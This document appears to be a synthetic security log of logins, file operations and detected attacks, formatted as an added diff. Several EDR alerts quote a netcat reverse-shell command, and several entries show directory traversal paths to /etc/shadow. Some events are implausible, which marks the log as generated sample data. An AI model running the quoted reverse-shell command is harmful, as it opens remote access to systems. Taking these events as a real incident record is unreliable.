@@ -1,0 +1,1110 @@
+2025-09-01 07:00:05 INFO File accessed: /var/www/html/admin.php by user 'guest'
+2025-09-01 07:00:10 INFO File uploaded: /etc/shadow by user 'root'
+2025-09-01 07:00:30 WARN Failed login attempt for user 'root' from 203.0.113.6
+2025-09-01 07:00:35 ERROR Malware signature detected in file /etc/passwd uploaded by user 'admin'
+2025-09-01 07:06:00 INFO User 'svc-api' logged in from 192.168.0.47
+2025-09-01 07:06:05 INFO File accessed: /uploads/malware.exe by user 'admin'
+2025-09-01 07:06:20 INFO Backup completed successfully
+2025-09-01 07:06:30 WARN Failed login attempt for user 'root' from 203.0.113.48
+2025-09-01 07:06:35 ERROR SQL Injection attempt detected from 185.220.100.17 on /login.php
+2025-09-01 07:10:35 ERROR RCE exploit attempt blocked from 185.220.100.21 on /api/v1/auth
+2025-09-01 07:12:00 INFO User 'lee' logged in from 192.168.0.59
+2025-09-01 07:12:05 INFO File accessed: /tmp/backup.tar.gz by user 'root'
+2025-09-01 07:12:30 WARN Failed login attempt for user 'dbuser' from 203.0.113.4
+2025-09-01 07:12:35 WARN Anomalous outbound traffic to 45.155.204.30 from 192.168.0.53 exceeded threshold
+2025-09-01 07:18:05 INFO File accessed: /var/www/html/search.php by user 'lee'
+2025-09-01 07:18:15 INFO User 'monitor' logged out
+2025-09-01 07:18:20 INFO Backup completed successfully
+2025-09-01 07:18:35 ERROR SQL Injection attempt detected from 185.220.100.11 on /login.php
+2025-09-01 07:18:40 INFO File deleted: /api/v1/users by user 'admin'
+2025-09-01 07:20:00 INFO User 'backup' logged in from 192.168.0.55
+2025-09-01 07:20:05 INFO File accessed: /api/v1/orders by user 'svc-api'
+2025-09-01 07:20:20 INFO Backup completed successfully
+2025-09-01 07:20:25 INFO Session timeout for user 'monitor'
+2025-09-01 07:20:35 WARN Multiple failed login attempts for user 'svc-web' from 185.220.100.30
+2025-09-01 07:24:00 INFO User 'kim' logged in from 192.168.0.42
+2025-09-01 07:24:05 INFO File accessed: /tmp/image.png by user 'admin'
+2025-09-01 07:24:10 INFO File uploaded: /uploads/avatar.jpg by user 'kim'
+2025-09-01 07:24:35 ERROR Malware signature detected in file /home/admin/docs/data.csv uploaded by user 'root'
+2025-09-01 07:30:10 INFO File uploaded: /api/v1/orders by user 'guest'
+2025-09-01 07:30:15 INFO User 'admin' logged out
+2025-09-01 07:30:30 WARN Failed login attempt for user 'monitor' from 45.155.204.46
+2025-09-01 07:30:35 ERROR SQL Injection attempt detected from 185.220.100.34 on /var/www/html/login.php
+2025-09-01 07:34:05 INFO File accessed: /var/www/html/search.php by user 'lee'
+2025-09-01 07:34:15 INFO User 'monitor' logged out
+2025-09-01 07:34:35 ERROR SQL Injection attempt detected from 203.0.113.43 on /var/log/secure
+2025-09-01 07:38:00 INFO User 'lee' logged in from 192.168.0.46
+2025-09-01 07:38:10 INFO File uploaded: /tmp/image.png by user 'svc-api'
+2025-09-01 07:38:25 INFO Session timeout for user 'svc-api'
+2025-09-01 07:38:35 ERROR SQL Injection attempt detected from 5.181.80.36 on /tmp/avatar.jpg
+2025-09-01 07:44:35 WARN Unauthorized access attempt to /var/www/html/admin.php from 203.0.113.8
+2025-09-01 07:44:40 INFO File deleted: /home/admin/docs/data.csv by user 'admin'
+2025-09-01 07:47:00 INFO User 'admin' logged in from 192.168.0.14
+2025-09-01 07:47:10 INFO File uploaded: /var/log/secure by user 'root'
+2025-09-01 07:47:15 INFO User 'dbuser' logged out
+2025-09-01 07:47:20 INFO Backup completed successfully
+2025-09-01 07:47:35 ERROR Malware signature detected in file /var/www/html/search.php uploaded by user 'backup'
+2025-09-01 07:50:10 INFO File uploaded: /etc/shadow by user 'root'
+2025-09-01 07:50:35 WARN Anomalous outbound traffic to 45.155.204.16 from 192.168.0.16 exceeded threshold
+2025-09-01 07:50:40 INFO File deleted: /var/www/html/admin.php by user 'root'
+2025-09-01 07:53:00 INFO User 'svc-api' logged in from 192.168.0.18
+2025-09-01 07:53:05 INFO File accessed: /home/guest/docs/report.docx by user 'guest'
+2025-09-01 07:53:10 INFO File uploaded: /home/root/docs/report.docx by user 'root'
+2025-09-01 07:53:25 INFO Session timeout for user 'monitor'
+2025-09-01 07:53:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-01 07:56:00 INFO User 'svc-api' logged in from 192.168.0.40
+2025-09-01 07:56:05 INFO File accessed: /var/log/secure by user 'svc-web'
+2025-09-01 07:56:10 INFO File uploaded: /var/www/html/index.php by user 'svc-web'
+2025-09-01 07:56:35 WARN Unauthorized access attempt to /root/secure.db from 185.220.100.1
+2025-09-01 08:01:00 INFO User 'guest' logged in from 192.168.0.23
+2025-09-01 08:01:25 INFO Session timeout for user 'backup'
+2025-09-01 08:01:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-01 08:03:05 INFO File accessed: /var/www/html/login.php by user 'kim'
+2025-09-01 08:03:20 INFO Backup completed successfully
+2025-09-01 08:03:25 INFO Session timeout for user 'backup'
+2025-09-01 08:03:30 WARN Failed login attempt for user 'backup' from 198.51.100.11
+2025-09-01 08:03:35 ERROR RCE exploit attempt blocked from 5.181.80.8 on /etc/shadow
+2025-09-01 08:09:00 INFO User 'guest' logged in from 192.168.0.23
+2025-09-01 08:09:10 INFO File uploaded: /api/v1/orders by user 'guest'
+2025-09-01 08:09:15 INFO User 'guest' logged out
+2025-09-01 08:09:35 ERROR SQL Injection attempt detected from 45.155.204.10 on /login.php
+2025-09-01 08:11:00 INFO User 'lee' logged in from 192.168.0.42
+2025-09-01 08:11:05 INFO File accessed: /var/log/secure by user 'dbuser'
+2025-09-01 08:11:10 INFO File uploaded: /api/v1/auth by user 'lee'
+2025-09-01 08:11:15 INFO User 'svc-api' logged out
+2025-09-01 08:11:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-01 08:13:15 INFO User 'kim' logged out
+2025-09-01 08:13:35 ERROR SQL Injection attempt detected from 203.0.113.23 on /etc/passwd
+2025-09-01 08:13:40 INFO File deleted: /etc/shadow by user 'admin'
+2025-09-01 08:17:00 INFO User 'guest' logged in from 192.168.0.13
+2025-09-01 08:17:05 INFO File accessed: /tmp/cache.log by user 'svc-web'
+2025-09-01 08:17:10 INFO File uploaded: /uploads/malware.exe by user 'dbuser'
+2025-09-01 08:17:35 WARN Unauthorized access attempt to /var/www/html/index.php from 198.51.100.29
+2025-09-01 08:17:40 INFO File deleted: /home/kim/docs/data.csv by user 'kim'
+2025-09-01 08:19:10 INFO File uploaded: /var/www/html/index.php by user 'kim'
+2025-09-01 08:19:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 203.0.113.4 4444' detected by EDR
+2025-09-01 08:21:00 INFO User 'monitor' logged in from 192.168.0.36
+2025-09-01 08:21:20 INFO Backup completed successfully
+2025-09-01 08:21:25 INFO Session timeout for user 'kim'
+2025-09-01 08:21:35 ERROR SQL Injection attempt detected from 45.155.204.39 on /login.php
+2025-09-01 08:26:15 INFO User 'root' logged out
+2025-09-01 08:26:25 INFO Session timeout for user 'svc-api'
+2025-09-01 08:26:30 WARN Failed login attempt for user 'svc-api' from 203.0.113.40
+2025-09-01 08:26:35 WARN Brute force attack suspected for user 'lee' from 203.0.113.8
+2025-09-01 08:26:40 INFO File deleted: /api/v1/auth by user 'admin'
+2025-09-01 08:30:10 INFO File uploaded: /api/v1/orders by user 'monitor'
+2025-09-01 08:30:30 WARN Failed login attempt for user 'guest' from 198.51.100.46
+2025-09-01 08:30:35 ERROR RCE exploit attempt blocked from 203.0.113.18 on /var/www/html/index.php
+2025-09-01 08:30:40 INFO File deleted: /root/secure.db by user 'admin'
+2025-09-01 08:34:00 INFO User 'monitor' logged in from 192.168.0.17
+2025-09-01 08:34:05 INFO File accessed: /var/www/html/admin.php by user 'backup'
+2025-09-01 08:34:10 INFO File uploaded: /var/www/html/index.php by user 'svc-web'
+2025-09-01 08:34:35 WARN Anomalous outbound traffic to 203.0.113.1 from 192.168.0.33 exceeded threshold
+2025-09-01 08:38:10 INFO File uploaded: /home/guest/docs/data.csv by user 'guest'
+2025-09-01 08:38:30 WARN Failed login attempt for user 'kim' from 198.51.100.50
+2025-09-01 08:38:35 WARN Unauthorized access attempt to /api/v1/orders from 45.155.204.24
+2025-09-01 08:41:05 INFO File accessed: /tmp/report.pdf by user 'monitor'
+2025-09-01 08:41:10 INFO File uploaded: /api/v1/orders by user 'lee'
+2025-09-01 08:41:35 WARN Anomalous outbound traffic to 5.181.80.31 from 192.168.0.40 exceeded threshold
+2025-09-01 08:44:05 INFO File accessed: /api/v1/auth by user 'backup'
+2025-09-01 08:44:10 INFO File uploaded: /etc/shadow by user 'lee'
+2025-09-01 08:44:25 INFO Session timeout for user 'admin'
+2025-09-01 08:44:30 WARN Failed login attempt for user 'svc-api' from 45.155.204.7
+2025-09-01 08:44:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 198.51.100.19 4444' detected by EDR
+2025-09-01 08:50:00 INFO User 'svc-web' logged in from 192.168.0.41
+2025-09-01 08:50:05 INFO File accessed: /etc/shadow by user 'kim'
+2025-09-01 08:50:35 ERROR Malware signature detected in file /uploads/invoice.xlsx uploaded by user 'admin'
+2025-09-01 08:52:00 INFO User 'svc-api' logged in from 192.168.0.52
+2025-09-01 08:52:05 INFO File accessed: /etc/passwd by user 'monitor'
+2025-09-01 08:52:10 INFO File uploaded: /etc/passwd by user 'svc-api'
+2025-09-01 08:52:35 WARN Unauthorized access attempt to /var/www/html/search.php from 45.155.204.41
+2025-09-01 08:57:00 INFO User 'lee' logged in from 192.168.0.50
+2025-09-01 08:57:05 INFO File accessed: /home/monitor/docs/report.docx by user 'monitor'
+2025-09-01 08:57:15 INFO User 'root' logged out
+2025-09-01 08:57:30 WARN Failed login attempt for user 'monitor' from 198.51.100.21
+2025-09-01 08:57:35 ERROR SQL Injection attempt detected from 203.0.113.10 on /api/v1/orders
+2025-09-01 09:00:00 INFO User 'svc-web' logged in from 192.168.0.31
+2025-09-01 09:00:05 INFO File accessed: /var/www/html/index.php by user 'svc-web'
+2025-09-01 09:00:10 INFO File uploaded: /api/v1/orders by user 'svc-web'
+2025-09-01 09:00:35 WARN Multiple failed login attempts for user 'svc-web' from 5.181.80.23
+2025-09-01 09:00:40 INFO File deleted: /uploads/avatar.jpg by user 'admin'
+2025-09-01 09:05:00 INFO User 'monitor' logged in from 192.168.0.48
+2025-09-01 09:05:15 INFO User 'svc-api' logged out
+2025-09-01 09:05:20 INFO Backup completed successfully
+2025-09-01 09:05:35 WARN Port scan detected from 198.51.100.43 targeting 192.168.0.39
+2025-09-01 09:11:00 INFO User 'svc-web' logged in from 192.168.0.47
+2025-09-01 09:11:10 INFO File uploaded: /var/www/html/search.php by user 'svc-web'
+2025-09-01 09:11:20 INFO Backup completed successfully
+2025-09-01 09:11:30 WARN Failed login attempt for user 'svc-api' from 203.0.113.34
+2025-09-01 09:11:35 WARN Brute force attack suspected for user 'svc-web' from 203.0.113.22
+2025-09-01 09:16:00 INFO User 'root' logged in from 192.168.0.40
+2025-09-01 09:16:05 INFO File accessed: /var/www/html/index.php by user 'monitor'
+2025-09-01 09:16:35 WARN Multiple failed login attempts for user 'lee' from 203.0.113.2
+2025-09-01 09:22:00 INFO User 'kim' logged in from 192.168.0.40
+2025-09-01 09:22:15 INFO User 'guest' logged out
+2025-09-01 09:22:25 INFO Session timeout for user 'backup'
+2025-09-01 09:22:35 WARN Anomalous outbound traffic to 45.155.204.50 from 192.168.0.20 exceeded threshold
+2025-09-01 09:24:00 INFO User 'guest' logged in from 192.168.0.46
+2025-09-01 09:24:25 INFO Session timeout for user 'lee'
+2025-09-01 09:24:30 WARN Failed login attempt for user 'guest' from 185.220.100.18
+2025-09-01 09:24:35 WARN Anomalous outbound traffic to 185.220.100.7 from 192.168.0.17 exceeded threshold
+2025-09-01 09:30:05 INFO File accessed: /etc/shadow by user 'svc-web'
+2025-09-01 09:30:35 ERROR SQL Injection attempt detected from 185.220.100.46 on /api/v1/auth
+2025-09-01 09:35:05 INFO File accessed: /etc/shadow by user 'monitor'
+2025-09-01 09:35:10 INFO File uploaded: /uploads/invoice.xlsx by user 'monitor'
+2025-09-01 09:35:30 WARN Failed login attempt for user 'lee' from 185.220.100.13
+2025-09-01 09:35:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-01 09:40:00 INFO User 'svc-api' logged in from 192.168.0.46
+2025-09-01 09:40:15 INFO User 'dbuser' logged out
+2025-09-01 09:40:20 INFO Backup completed successfully
+2025-09-01 09:40:35 WARN Port scan detected from 185.220.100.26 targeting 192.168.0.48
+2025-09-01 09:44:00 INFO User 'monitor' logged in from 192.168.0.22
+2025-09-01 09:44:05 INFO File accessed: /home/svc-web/docs/report.docx by user 'svc-web'
+2025-09-01 09:44:15 INFO User 'svc-api' logged out
+2025-09-01 09:44:35 ERROR SQL Injection attempt detected from 203.0.113.7 on /login.php
+2025-09-01 09:47:00 INFO User 'backup' logged in from 192.168.0.33
+2025-09-01 09:47:05 INFO File accessed: /api/v1/auth by user 'monitor'
+2025-09-01 09:47:30 WARN Failed login attempt for user 'guest' from 203.0.113.10
+2025-09-01 09:47:35 ERROR SQL Injection attempt detected from 198.51.100.50 on /api/v1/auth
+2025-09-01 09:47:40 INFO File deleted: /var/www/html/admin.php by user 'kim'
+2025-09-01 09:50:05 INFO File accessed: /uploads/cache.log by user 'backup'
+2025-09-01 09:50:30 WARN Failed login attempt for user 'monitor' from 198.51.100.33
+2025-09-01 09:50:35 WARN Brute force attack suspected for user 'admin' from 5.181.80.42
+2025-09-01 09:53:10 INFO File uploaded: /etc/passwd by user 'admin'
+2025-09-01 09:53:15 INFO User 'svc-api' logged out
+2025-09-01 09:53:25 INFO Session timeout for user 'admin'
+2025-09-01 09:53:30 WARN Failed login attempt for user 'svc-api' from 198.51.100.30
+2025-09-01 09:53:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 5.181.80.3 4444' detected by EDR
+2025-09-01 09:59:05 INFO File accessed: /uploads/cache.log by user 'kim'
+2025-09-01 09:59:10 INFO File uploaded: /var/www/html/login.php by user 'lee'
+2025-09-01 09:59:35 WARN Multiple failed login attempts for user 'svc-web' from 5.181.80.16
+2025-09-01 10:03:10 INFO File uploaded: /var/www/html/index.php by user 'backup'
+2025-09-01 10:03:30 WARN Failed login attempt for user 'lee' from 203.0.113.18
+2025-09-01 10:03:35 WARN Anomalous outbound traffic to 198.51.100.41 from 192.168.0.25 exceeded threshold
+2025-09-01 10:03:40 INFO File deleted: /var/www/html/index.php by user 'admin'
+2025-09-01 10:08:00 INFO User 'backup' logged in from 192.168.0.40
+2025-09-01 10:08:05 INFO File accessed: /api/v1/users by user 'lee'
+2025-09-01 10:08:35 WARN Multiple failed login attempts for user 'backup' from 45.155.204.20
+2025-09-01 10:11:00 INFO User 'monitor' logged in from 192.168.0.24
+2025-09-01 10:11:20 INFO Backup completed successfully
+2025-09-01 10:11:25 INFO Session timeout for user 'guest'
+2025-09-01 10:11:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 185.220.100.36 4444' detected by EDR
+2025-09-01 10:13:00 INFO User 'guest' logged in from 192.168.0.54
+2025-09-01 10:13:05 INFO File accessed: /home/guest/docs/data.csv by user 'guest'
+2025-09-01 10:13:35 ERROR RCE exploit attempt blocked from 198.51.100.7 on /var/www/html/login.php
+2025-09-01 10:13:40 INFO File deleted: /etc/passwd by user 'backup'
+2025-09-01 10:15:10 INFO File uploaded: /uploads/malware.exe by user 'admin'
+2025-09-01 10:15:30 WARN Failed login attempt for user 'backup' from 5.181.80.12
+2025-09-01 10:15:35 ERROR RCE exploit attempt blocked from 5.181.80.26 on /var/www/html/login.php
+2025-09-01 10:20:00 INFO User 'root' logged in from 192.168.0.20
+2025-09-01 10:20:05 INFO File accessed: /api/v1/users by user 'svc-api'
+2025-09-01 10:20:25 INFO Session timeout for user 'root'
+2025-09-01 10:20:30 WARN Failed login attempt for user 'dbuser' from 198.51.100.30
+2025-09-01 10:20:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-01 10:26:05 INFO File accessed: /home/monitor/docs/report.docx by user 'monitor'
+2025-09-01 10:26:15 INFO User 'dbuser' logged out
+2025-09-01 10:26:35 ERROR SQL Injection attempt detected from 203.0.113.19 on /login.php
+2025-09-01 10:30:00 INFO User 'svc-api' logged in from 192.168.0.17
+2025-09-01 10:30:05 INFO File accessed: /uploads/backup.tar.gz by user 'backup'
+2025-09-01 10:30:20 INFO Backup completed successfully
+2025-09-01 10:30:30 WARN Failed login attempt for user 'root' from 5.181.80.19
+2025-09-02 07:00:00 INFO User 'guest' logged in from 192.168.0.42
+2025-09-02 07:00:30 WARN Failed login attempt for user 'lee' from 185.220.100.36
+2025-09-02 07:00:35 ERROR RCE exploit attempt blocked from 45.155.204.42 on /var/log/secure
+2025-09-02 07:00:40 INFO File deleted: /uploads/avatar.jpg by user 'admin'
+2025-09-02 07:04:05 INFO File accessed: /api/v1/users by user 'admin'
+2025-09-02 07:04:35 WARN Unauthorized access attempt to /home/dbuser/docs/report.docx from 203.0.113.36
+2025-09-02 07:10:00 INFO User 'dbuser' logged in from 192.168.0.22
+2025-09-02 07:10:10 INFO File uploaded: /var/www/html/admin.php by user 'svc-web'
+2025-09-02 07:10:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-02 07:13:00 INFO User 'admin' logged in from 192.168.0.18
+2025-09-02 07:13:05 INFO File accessed: /api/v1/auth by user 'backup'
+2025-09-02 07:13:35 WARN Anomalous outbound traffic to 5.181.80.5 from 192.168.0.51 exceeded threshold
+2025-09-02 07:15:00 INFO User 'guest' logged in from 192.168.0.31
+2025-09-02 07:15:15 INFO User 'dbuser' logged out
+2025-09-02 07:15:35 WARN Brute force attack suspected for user 'svc-api' from 185.220.100.24
+2025-09-02 07:21:00 INFO User 'guest' logged in from 192.168.0.24
+2025-09-02 07:21:15 INFO User 'root' logged out
+2025-09-02 07:21:35 ERROR SQL Injection attempt detected from 185.220.100.4 on /login.php
+2025-09-02 07:21:40 INFO File deleted: /api/v1/orders by user 'admin'
+2025-09-02 07:24:00 INFO User 'svc-web' logged in from 192.168.0.46
+2025-09-02 07:24:10 INFO File uploaded: /var/www/html/login.php by user 'kim'
+2025-09-02 07:24:35 ERROR RCE exploit attempt blocked from 203.0.113.10 on /home/guest/docs/report.docx
+2025-09-02 07:26:05 INFO File accessed: /etc/shadow by user 'guest'
+2025-09-02 07:26:15 INFO User 'dbuser' logged out
+2025-09-02 07:26:35 WARN Anomalous outbound traffic to 5.181.80.17 from 192.168.0.29 exceeded threshold
+2025-09-02 07:26:40 INFO File deleted: /home/admin/docs/report.docx by user 'admin'
+2025-09-02 07:28:00 INFO User 'backup' logged in from 192.168.0.32
+2025-09-02 07:28:15 INFO User 'svc-web' logged out
+2025-09-02 07:28:35 WARN Multiple failed login attempts for user 'admin' from 185.220.100.34
+2025-09-02 07:33:15 INFO User 'dbuser' logged out
+2025-09-02 07:33:20 INFO Backup completed successfully
+2025-09-02 07:33:25 INFO Session timeout for user 'guest'
+2025-09-02 07:33:35 WARN Anomalous outbound traffic to 45.155.204.19 from 192.168.0.53 exceeded threshold
+2025-09-02 07:35:10 INFO File uploaded: /var/www/html/index.php by user 'svc-api'
+2025-09-02 07:35:25 INFO Session timeout for user 'guest'
+2025-09-02 07:35:30 WARN Failed login attempt for user 'svc-web' from 198.51.100.45
+2025-09-02 07:35:35 ERROR Malware signature detected in file /uploads/notes.txt uploaded by user 'monitor'
+2025-09-02 07:39:05 INFO File accessed: /uploads/cache.log by user 'svc-api'
+2025-09-02 07:39:20 INFO Backup completed successfully
+2025-09-02 07:39:30 WARN Failed login attempt for user 'lee' from 185.220.100.21
+2025-09-02 07:39:35 WARN Anomalous outbound traffic to 45.155.204.23 from 192.168.0.35 exceeded threshold
+2025-09-02 07:45:00 INFO User 'svc-web' logged in from 192.168.0.10
+2025-09-02 07:45:05 INFO File accessed: /home/root/docs/report.docx by user 'root'
+2025-09-02 07:45:35 WARN Port scan detected from 45.155.204.23 targeting 192.168.0.24
+2025-09-02 07:51:15 INFO User 'root' logged out
+2025-09-02 07:51:35 ERROR RCE exploit attempt blocked from 198.51.100.30 on /var/www/html/search.php
+2025-09-02 07:51:40 INFO File deleted: /home/admin/docs/report.docx by user 'admin'
+2025-09-02 07:53:00 INFO User 'monitor' logged in from 192.168.0.18
+2025-09-02 07:53:05 INFO File accessed: /etc/shadow by user 'dbuser'
+2025-09-02 07:53:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 45.155.204.18 4444' detected by EDR
+2025-09-02 07:53:40 INFO File deleted: /api/v1/orders by user 'admin'
+2025-09-02 07:57:00 INFO User 'dbuser' logged in from 192.168.0.23
+2025-09-02 07:57:05 INFO File accessed: /tmp/notes.txt by user 'lee'
+2025-09-02 07:57:10 INFO File uploaded: /home/dbuser/docs/data.csv by user 'dbuser'
+2025-09-02 07:57:25 INFO Session timeout for user 'guest'
+2025-09-02 07:57:30 WARN Failed login attempt for user 'root' from 185.220.100.43
+2025-09-02 07:57:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 5.181.80.17 4444' detected by EDR
+2025-09-02 07:57:40 INFO File deleted: /etc/shadow by user 'admin'
+2025-09-02 08:03:05 INFO File accessed: /var/www/html/admin.php by user 'dbuser'
+2025-09-02 08:03:20 INFO Backup completed successfully
+2025-09-02 08:03:35 ERROR RCE exploit attempt blocked from 185.220.100.9 on /tmp/backup.tar.gz
+2025-09-02 08:06:10 INFO File uploaded: /var/www/html/search.php by user 'kim'
+2025-09-02 08:06:25 INFO Session timeout for user 'admin'
+2025-09-02 08:06:30 WARN Failed login attempt for user 'dbuser' from 185.220.100.3
+2025-09-02 08:06:35 WARN Multiple failed login attempts for user 'backup' from 203.0.113.33
+2025-09-02 08:06:40 INFO File deleted: /var/www/html/search.php by user 'admin'
+2025-09-02 08:11:00 INFO User 'root' logged in from 192.168.0.40
+2025-09-02 08:11:05 INFO File accessed: /home/dbuser/docs/data.csv by user 'dbuser'
+2025-09-02 08:11:20 INFO Backup completed successfully
+2025-09-02 08:11:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-02 08:15:00 INFO User 'admin' logged in from 192.168.0.13
+2025-09-02 08:15:20 INFO Backup completed successfully
+2025-09-02 08:15:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 203.0.113.33 4444' detected by EDR
+2025-09-02 08:17:00 INFO User 'backup' logged in from 192.168.0.50
+2025-09-02 08:17:35 WARN Unauthorized access attempt to /uploads/image.png from 185.220.100.19
+2025-09-02 08:23:05 INFO File accessed: /var/log/secure by user 'svc-api'
+2025-09-02 08:23:10 INFO File uploaded: /tmp/invoice.xlsx by user 'dbuser'
+2025-09-02 08:23:30 WARN Failed login attempt for user 'guest' from 203.0.113.46
+2025-09-02 08:23:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-02 08:28:00 INFO User 'root' logged in from 192.168.0.15
+2025-09-02 08:28:05 INFO File accessed: /uploads/malware.exe by user 'dbuser'
+2025-09-02 08:28:30 WARN Failed login attempt for user 'dbuser' from 185.220.100.24
+2025-09-02 08:28:35 WARN Anomalous outbound traffic to 45.155.204.43 from 192.168.0.37 exceeded threshold
+2025-09-02 08:30:20 INFO Backup completed successfully
+2025-09-02 08:30:30 WARN Failed login attempt for user 'root' from 203.0.113.40
+2025-09-02 08:30:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 203.0.113.45 4444' detected by EDR
+2025-09-02 08:30:40 INFO File deleted: /var/www/html/admin.php by user 'admin'
+2025-09-02 08:35:25 INFO Session timeout for user 'guest'
+2025-09-02 08:35:30 WARN Failed login attempt for user 'guest' from 45.155.204.30
+2025-09-02 08:35:35 WARN Multiple failed login attempts for user 'dbuser' from 203.0.113.40
+2025-09-02 08:35:40 INFO File deleted: /etc/shadow by user 'backup'
+2025-09-02 08:40:00 INFO User 'admin' logged in from 192.168.0.15
+2025-09-02 08:40:10 INFO File uploaded: /home/svc-web/docs/report.docx by user 'svc-web'
+2025-09-02 08:40:35 WARN Unauthorized directory traversal attempt from 198.51.100.22 on /downloads/../../etc/shadow
+2025-09-02 08:43:00 INFO User 'backup' logged in from 192.168.0.13
+2025-09-02 08:43:10 INFO File uploaded: /home/svc-web/docs/report.docx by user 'svc-web'
+2025-09-02 08:43:35 WARN Port scan detected from 198.51.100.29 targeting 192.168.0.28
+2025-09-02 08:49:00 INFO User 'guest' logged in from 192.168.0.12
+2025-09-02 08:49:05 INFO File accessed: /var/www/html/index.php by user 'backup'
+2025-09-02 08:49:10 INFO File uploaded: /var/www/html/admin.php by user 'guest'
+2025-09-02 08:49:30 WARN Failed login attempt for user 'svc-api' from 45.155.204.42
+2025-09-02 08:49:35 WARN Unauthorized access attempt to /var/www/html/search.php from 203.0.113.48
+2025-09-02 08:52:00 INFO User 'dbuser' logged in from 192.168.0.14
+2025-09-02 08:52:05 INFO File accessed: /api/v1/orders by user 'admin'
+2025-09-02 08:52:10 INFO File uploaded: /tmp/notes.txt by user 'root'
+2025-09-02 08:52:35 ERROR SQL Injection attempt detected from 198.51.100.6 on /api/v1/auth
+2025-09-02 08:52:40 INFO File deleted: /tmp/notes.txt by user 'svc-api'
+2025-09-02 08:54:00 INFO User 'root' logged in from 192.168.0.25
+2025-09-02 08:54:05 INFO File accessed: /home/svc-web/docs/data.csv by user 'svc-web'
+2025-09-02 08:54:10 INFO File uploaded: /root/secure.db by user 'guest'
+2025-09-02 08:54:25 INFO Session timeout for user 'monitor'
+2025-09-02 08:54:35 WARN Unauthorized directory traversal attempt from 198.51.100.50 on /downloads/../../etc/shadow
+2025-09-02 08:58:00 INFO User 'kim' logged in from 192.168.0.25
+2025-09-02 08:58:05 INFO File accessed: /var/www/html/admin.php by user 'guest'
+2025-09-02 08:58:10 INFO File uploaded: /uploads/image.png by user 'kim'
+2025-09-02 08:58:15 INFO User 'svc-api' logged out
+2025-09-02 08:58:35 WARN Anomalous outbound traffic to 185.220.100.26 from 192.168.0.46 exceeded threshold
+2025-09-02 09:04:00 INFO User 'dbuser' logged in from 192.168.0.19
+2025-09-02 09:04:05 INFO File accessed: /home/svc-api/docs/report.docx by user 'svc-api'
+2025-09-02 09:04:30 WARN Failed login attempt for user 'svc-api' from 5.181.80.16
+2025-09-02 09:04:35 ERROR SQL Injection attempt detected from 203.0.113.45 on /login.php
+2025-09-02 09:06:10 INFO File uploaded: /home/backup/docs/data.csv by user 'backup'
+2025-09-02 09:06:35 ERROR SQL Injection attempt detected from 185.220.100.33 on /login.php
+2025-09-02 09:09:00 INFO User 'svc-api' logged in from 192.168.0.42
+2025-09-02 09:09:05 INFO File accessed: /home/admin/docs/report.docx by user 'admin'
+2025-09-02 09:09:10 INFO File uploaded: /root/secure.db by user 'dbuser'
+2025-09-02 09:09:15 INFO User 'kim' logged out
+2025-09-02 09:09:20 INFO Backup completed successfully
+2025-09-02 09:09:35 WARN Unauthorized directory traversal attempt from 45.155.204.7 on /downloads/../../etc/shadow
+2025-09-02 09:09:40 INFO File deleted: /api/v1/users by user 'admin'
+2025-09-02 09:14:00 INFO User 'dbuser' logged in from 192.168.0.53
+2025-09-02 09:14:20 INFO Backup completed successfully
+2025-09-02 09:14:25 INFO Session timeout for user 'svc-web'
+2025-09-02 09:14:30 WARN Failed login attempt for user 'backup' from 185.220.100.24
+2025-09-02 09:14:35 ERROR SQL Injection attempt detected from 198.51.100.21 on /etc/passwd
+2025-09-02 09:18:00 INFO User 'svc-web' logged in from 192.168.0.18
+2025-09-02 09:18:35 WARN Anomalous outbound traffic to 185.220.100.13 from 192.168.0.57 exceeded threshold
+2025-09-02 09:24:00 INFO User 'svc-web' logged in from 192.168.0.42
+2025-09-02 09:24:05 INFO File accessed: /api/v1/users by user 'dbuser'
+2025-09-02 09:24:10 INFO File uploaded: /api/v1/auth by user 'lee'
+2025-09-02 09:24:30 WARN Failed login attempt for user 'root' from 203.0.113.26
+2025-09-02 09:24:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 198.51.100.26 4444' detected by EDR
+2025-09-02 09:30:10 INFO File uploaded: /var/log/secure by user 'dbuser'
+2025-09-02 09:30:20 INFO Backup completed successfully
+2025-09-02 09:30:30 WARN Failed login attempt for user 'backup' from 185.220.100.8
+2025-09-02 09:30:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-02 09:32:00 INFO User 'lee' logged in from 192.168.0.38
+2025-09-02 09:32:20 INFO Backup completed successfully
+2025-09-02 09:32:35 WARN Multiple failed login attempts for user 'lee' from 203.0.113.45
+2025-09-02 09:38:05 INFO File accessed: /uploads/avatar.jpg by user 'guest'
+2025-09-02 09:38:20 INFO Backup completed successfully
+2025-09-02 09:38:25 INFO Session timeout for user 'backup'
+2025-09-02 09:38:30 WARN Failed login attempt for user 'guest' from 198.51.100.14
+2025-09-02 09:38:35 ERROR RCE exploit attempt blocked from 185.220.100.24 on /api/v1/auth
+2025-09-02 09:40:05 INFO File accessed: /api/v1/users by user 'root'
+2025-09-02 09:40:10 INFO File uploaded: /api/v1/users by user 'kim'
+2025-09-02 09:40:30 WARN Failed login attempt for user 'lee' from 185.220.100.10
+2025-09-02 09:40:35 WARN Unauthorized access attempt to /api/v1/auth from 185.220.100.39
+2025-09-02 09:40:40 INFO File deleted: /home/admin/docs/data.csv by user 'admin'
+2025-09-02 09:44:00 INFO User 'root' logged in from 192.168.0.33
+2025-09-02 09:44:05 INFO File accessed: /var/log/secure by user 'dbuser'
+2025-09-02 09:44:10 INFO File uploaded: /uploads/malware.exe by user 'dbuser'
+2025-09-02 09:44:15 INFO User 'guest' logged out
